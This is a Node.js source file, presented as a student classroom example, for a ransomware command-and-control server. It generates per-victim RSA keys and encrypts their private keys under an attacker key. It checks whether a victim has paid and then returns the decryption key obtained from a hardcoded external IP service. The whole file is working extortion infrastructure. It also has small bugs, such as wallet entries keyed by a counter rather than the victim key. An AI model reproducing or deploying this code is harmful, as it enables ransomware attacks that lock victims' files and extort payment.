/*

    This is an example of a basic C2 server
    It is for educational purpose created by students
    @ Cal State Long Beach for Intro to Cyber Security
    CECS 378

*/

const fs = require('fs');
const express = require('express');
const app = express();
const crypto = require('crypto'); // Crypto module for RSA key
const axios = require('axios');

app.use(express.json());

const keys = {};
const wallets = {}; // Matches pub_keys with crypto wallet

let attk_pub = null;
const attk_pub_path = "./attk_pub.pem";
const decrypter_url = "http://34.44.100.30:5000/decrypt";

var key_count = 0;

// Load Public Key to Encrypt Private Keys
if (fs.existsSync(attk_pub_path))
    attk_pub = fs.readFileSync(attk_pub_path, 'utf8');
else
    console.log("Couldn't Find Attacker Public Key");

if (!attk_pub)
    process.exit();

// Check if victim has paid
app.post('/check-payment', async (req, res) => {
    const {pub_key} = req.body;
    
    // Validate
    if (!pub_key)
        return res.status(400).json({ error: "Missing Key" });

    // This is where the app would use the wallet id to see if a payment
    // was made to us, each wallet being unique to a user
    let paid = wallets[pub_key];

    if (paid) {
        const priv_key = keys[pub_key];
        

        // Decrypt private key
        const request = await axios.post(decrypter_url, {
            to_decrypt: priv_key
        });

        const decrypted = request.data.privateKey;

        return res.status(200).json({ success: "true", key: decrypted});
    }

    return res.status(400).json({ success: "false", msg: "Not Paid"});
});

// Post request for testing purposes, irl would use bitcoin ledger to check
app.post('/simulate-payment', (req, res) => {
    const {pub_key} = req.body;
    if (!pub_key)
        return res.status(400).json({ msg: "Missing Key" });

    wallets[pub_key] = true;
    return res.status(200).json({ msg:"Paid!"});
});

app.get('/', (req, res) => {
    res.send("Welcome to my C2 Server");
});

app.get('/has-paid/:key', (req, res) => {
    res.send(""+wallets[req.params.key])
});

// This is what an attacker would use to get a unique RSA public key for
// each victim
app.get('/gen-key', (req, res) => {
    // Generate RSA key
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
        modulusLength: 1024, // length of bits for RSA key
        publicKeyEncoding: {
            type: 'pkcs1', // SPKI format
            format: 'pem' // PEM format
        },
        privateKeyEncoding: {
            type: 'pkcs1', // PKCS8 format
            format: 'pem' // PEM format
        }
    });
    
    // store keys
    const secret_priv = crypto.publicEncrypt(
        {
            key: attk_pub,
            padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
            oaepHash: "sha256"
        },
        Buffer.from(privateKey)
    );

    keys[publicKey] = secret_priv.toString('base64');

    // send back public key
    res.status(200).json({pub_key: publicKey});

    // increments key count
    key_count+=1;

    // set wallet for public key
    wallets[key_count-1] = false;
});

app.listen(3000, () => {
    console.log("Listening on port 3000");
});
